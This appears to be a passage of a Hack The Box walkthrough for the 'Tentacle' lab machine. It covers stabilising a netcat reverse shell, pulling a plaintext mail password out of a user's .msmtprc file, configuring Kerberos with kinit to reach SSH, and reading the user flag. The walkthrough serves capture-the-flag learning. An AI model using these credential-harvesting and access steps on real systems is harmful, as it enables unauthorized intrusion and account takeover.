# Enumeration-

Stablizing shell-

```bash
root@napster:~/Documents/HTB/Tentacle# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.82] from (UNKNOWN) [10.10.10.224] 46284
bash: cannot set terminal process group (13): Inappropriate ioctl for device
bash: no job control in this shell
root@smtp:~# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@smtp:~# ^Z
[1]+  Stopped                 nc -nvlp 9001
root@napster:~/Documents/HTB/Tentacle# stty raw -echo
root@napster:~/Documents/HTB/Tentacle# nc -nvlp 9001

root@smtp:~# export TERM=xterm
```

```bash
root@smtp:~# ls -la 
total 8
drwx------. 1 root root 151 Dec 24  2020 .
drwxr-xr-x. 1 root root  96 Dec  8  2020 ..
lrwxrwxrwx. 1 root root   9 Dec  9  2020 .bash_history -> /dev/null
-rw-r--r--. 1 root root 570 Jan 31  2010 .bashrc
-rw-r--r--. 1 root root 148 Aug 17  2015 .profile
lrwxrwxrwx. 1 root root   9 Dec  9  2020 .viminfo -> /dev/null
root@smtp:~# pwd
/root
root@smtp:~# cd /home
root@smtp:/home# ls -la
total 0
drwxr-xr-x. 1 root       root       24 Dec  8  2020 .
drwxr-xr-x. 1 root       root       96 Dec  8  2020 ..
drwxr-xr-x. 1 j.nakazawa j.nakazawa 59 Dec  9  2020 j.nakazawa
root@smtp:/home# cd j.nakazawa/.
root@smtp:/home/j.nakazawa# ls -la
total 16
drwxr-xr-x. 1 j.nakazawa j.nakazawa   59 Dec  9  2020 .
drwxr-xr-x. 1 root       root         24 Dec  8  2020 ..
lrwxrwxrwx. 1 root       root          9 Dec  9  2020 .bash_history -> /dev/null
-rw-r--r--. 1 j.nakazawa j.nakazawa  220 Apr 18  2019 .bash_logout
-rw-r--r--. 1 j.nakazawa j.nakazawa 3526 Apr 18  2019 .bashrc
-rw-------. 1 j.nakazawa j.nakazawa  476 Dec  8  2020 .msmtprc
-rw-r--r--. 1 j.nakazawa j.nakazawa  807 Apr 18  2019 .profile
lrwxrwxrwx. 1 root       root          9 Dec  9  2020 .viminfo -> /dev/null
root@smtp:/home/j.nakazawa# cat .msmtprc 
# Set default values for all following accounts.
defaults
auth           on
tls            on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile        /dev/null

# RealCorp Mail
account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM>6Z~64_
tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60

# Set a default account
account default : realcorp
```

`.msmtprc` is the only unusual file. It’s a config file for a lightweight SMTP client, and can often include credentials. In this case, it does:

```
user           j.nakazawa
password       sJB}RM>6Z~64_
```

# SSH-

FAILED-

```bash
root@napster:~/Documents/HTB/Tentacle#  ssh j.nakazawa@10.10.10.224
The authenticity of host '10.10.10.224 (10.10.10.224)' can't be established.
ECDSA key fingerprint is SHA256:eWzMB5HoqVH++9udWLB4bYS/8KguhJxNZPtZ3JLc3oo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.224' (ECDSA) to the list of known hosts.
j.nakazawa@10.10.10.224's password: 
Permission denied, please try again.
j.nakazawa@10.10.10.224's password: 
Permission denied, please try again.
j.nakazawa@10.10.10.224's password: 
j.nakazawa@10.10.10.224: Permission denied (gssapi-keyex,gssapi-with-mic,password).
root@napster:~/Documents/HTB/Tentacle# proxychains ssh j.nakazawa@10.197.243.77
ProxyChains-3.1 (http://proxychains.sf.net)
The authenticity of host '10.197.243.77 (10.197.243.77)' can't be established.
ECDSA key fingerprint is SHA256:eWzMB5HoqVH++9udWLB4bYS/8KguhJxNZPtZ3JLc3oo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.197.243.77' (ECDSA) to the list of known hosts.
j.nakazawa@10.197.243.77's password: 
Permission denied, please try again.
j.nakazawa@10.197.243.77's password: 
Permission denied, please try again.
j.nakazawa@10.197.243.77's password: 
j.nakazawa@10.197.243.77: Permission denied (gssapi-keyex,gssapi-with-mic,password).
root@napster:~/Documents/HTB/Tentacle# proxychains ssh j.nakazawa@10.197.243.31
ProxyChains-3.1 (http://proxychains.sf.net)
The authenticity of host '10.197.243.31 (10.197.243.31)' can't be established.
ECDSA key fingerprint is SHA256:eWzMB5HoqVH++9udWLB4bYS/8KguhJxNZPtZ3JLc3oo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.197.243.31' (ECDSA) to the list of known hosts.
j.nakazawa@10.197.243.31's password: 
Permission denied, please try again.
j.nakazawa@10.197.243.31's password: 
Permission denied, please try again.
j.nakazawa@10.197.243.31's password: 
j.nakazawa@10.197.243.31: Permission denied (gssapi-keyex,gssapi-with-mic,password).
```


# Kerberos Auth-

Since this is a linux box and kerberos is on it..Let's try to poke with it-

I’ll install a client, `sudo apt install krb5-user`.

The command to get a ticket is `kinit`. Running it with no args tries to get a ticket as `oxdf@ATHENA.MIT.EDU`:

```bash
root@napster:~/Documents/HTB/Tentacle# kinit 
kinit: Program lacks support for encryption type while getting initial credentials
root@napster:~/Documents/HTB/Tentacle# kinit j.nakazawa
kinit: Client 'j.nakazawa@ATHENA.MIT.EDU' not found in Kerberos database while getting initial credentials
root@napster:~/Documents/HTB/Tentacle# kinit j.nakazawa@realcorp.htb
kinit: Cannot find KDC for realm "realcorp.htb" while getting initial credentials
```

I’ll need to update `/etc/krb5.conf`. The current default version is set up for MIT:

```
[libdefaults]
    default_realm = ATHENA.MIT.EDU
...[snip]...
```

I’ll delete the current file and replace it with:

```
[libdefaults]
  default_realm = REALCORP.HTB

[realms]
  REALCORP.HTB = {
    kdc = realcorp.htb:88
    }
```

Now when I do `kinit`, it prompts for a password:

```bash
root@napster:~/Documents/HTB/Tentacle# kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB: 
```

On entering the password above, it just returns without message, which is good (entering a bad password throws an error). Running `klist` shows there’s a ticket on my system:

```bash
root@napster:~/Documents/HTB/Tentacle# klist 
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: j.nakazawa@REALCORP.HTB

Valid starting       Expires              Service principal
06/26/2021 18:38:02  06/27/2021 18:38:01  krbtgt/REALCORP.HTB@REALCORP.HTB
```

# SSH & User.txt-

Kerberos can be very picky about DNS names. I found that SSH would fail if I didn’t have `srv01.realcorp.htb` as the first host for the IP 10.10.10.224

```
10.10.10.224 srv01.realcorp.htb realcorp.htb root.realcorp.htb
```

```bash
root@napster:~/Documents/HTB/Tentacle# ssh j.nakazawa@10.10.10.224
Activate the web console with: systemctl enable --now cockpit.socket

Last failed login: Sat Jun 26 23:23:10 BST 2021 from 10.197.243.77 on ssh:notty
There were 9 failed login attempts since the last successful login.
Last login: Thu Dec 24 06:02:06 2020 from 10.10.14.2
[j.nakazawa@srv01 ~]$ sJB}RM>6Z~64_
-bash: sJB}RM: command not found
[j.nakazawa@srv01 ~]$ ls -la
total 16
drwxr-x---. 2 j.nakazawa j.nakazawa 129 Jun 26 23:43 .
drwxr-xr-x. 4 root       root        37 Nov  3  2020 ..
-rw-rw-r--. 1 j.nakazawa j.nakazawa   0 Jun 26 23:43 6Z~64_
lrwxrwxrwx. 1 root       root         9 Dec  9  2020 .bash_history -> /dev/null
-rw-r--r--. 1 j.nakazawa j.nakazawa  18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 j.nakazawa j.nakazawa 141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 j.nakazawa j.nakazawa 312 Nov  8  2019 .bashrc
lrwxrwxrwx. 1 root       root         9 Dec  9  2020 .lesshst -> /dev/null
-r--------. 1 j.nakazawa j.nakazawa  33 Jun 25 06:09 user.txt
[j.nakazawa@srv01 ~]$ cat user.txt 
af5650af4633e2d5c3b5ff14d650c507
```
